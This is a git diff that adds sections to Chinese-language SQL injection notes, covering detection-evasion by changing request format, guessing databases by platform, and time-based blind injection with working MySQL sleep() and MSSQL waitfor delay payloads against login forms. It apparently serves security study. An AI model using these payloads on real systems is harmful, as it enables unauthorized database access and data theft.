@@ -127,7 +127,55 @@ updatexml(XML_document, XPath_string, new_value);该函数是XML文档处理函�
 
 
 ### 13. 数据提交格式变种，绕过检测  
+正常的数据请求通过GET/POST，携带参数进行请求，可以将请求形式该为文件上传的请求形式。  
 
+### 14. 判断数据库技巧  
+1. Access一般用于小网站，类似企业站，功能比较简单，对数据要求不高。  
+2. Mssql是一个比较大的完善的数据库，在windows上常用于.NET ASP等程序。  
+3. Mysql是一个小型公开的免费数据库，在windows、linux上常用，和php程序组成一对完美搭档。  
+
+	ASP和.NET：Microsoft SQL Server   
+	PHP：Mysql、PosterSQL  
+	Java：Oracle、MySQL  
+
+### 15. 基于时间的SQL盲注--延时注入 
+延时注入是主要针对页面无变化、无法用布尔真假判断、无法报错的情况下的注入技术。  
+场景举例：例如某个登录场景，在用户名处注入不同的代码，响应均为用户名或验证码错误，甚至当注入 ' or '1'='1时，会被安全软件拦截  
+
+	1)admin-- 注入：  
+ 	
+ 		<div><span id="labMsg" style="color:Red;">用户名或密码错误</span></div>
+    	<div>
+        用户名 :
+        <br />
+        <input name="tbUserId" type="text" value="admin-- " id="tbUserId" style="width:80px;" />
+        <br />
+         密　码 :
+         <br />
+        <input name="tbPassWord" type="password" id="tbPassWord" style="width:80px;" />
+        <br />
+        <input type="submit" name="btnLogin" value="登录" id="btnLogin" />
+    </div>
+
+	2)admin' or '1'='1-- 注入： 
+	
+		<title>Virus/Spyware Download Blocked</title>
+
+1. Mysql Sleep()
+	
+	当在参数中带入”and sleep(2)"，后面的页面响应时间明显变换，那么基本可以确定这是一个延时注入：http://127.0.0.1/index.php?id=1 and if(length(database())=7,sleep(2),1)    
+	语句：select if(ascii(mid(user(),1,1))=114,sleep(2),1);  该语句的意思为查询user()用户名截取第一个字符 然后跟114对比（114为r的ascii码），如果条件成立执行sleep（2）延时2秒，否则执行查询输出1  
+	
+2. MSSQL waitfor delay
+
+	Microsoft SQL Server语句执行使用分号";"分割SQL语句，例如上述场景中，响应报文显示采用.NET架构，则数据库可能为MSSQL，在AND/OR型注入无果的情况下，进行延时注入：
+	
+		admin' ;if (1=2) waitfor delay '0:0:10'--
+		admin' ;if (1=1) waitfor delay '0:0:10'--
+	经过验证，if(1=2)时，立即获取到响应，if(1=1)时，响应延长，故存在延时注入漏洞。  
+	
+	
+	
 
 link:  
 [Oracle手注](https://blog.csdn.net/niexinming/article/details/48985873?utm_source=blogkpcl14)  
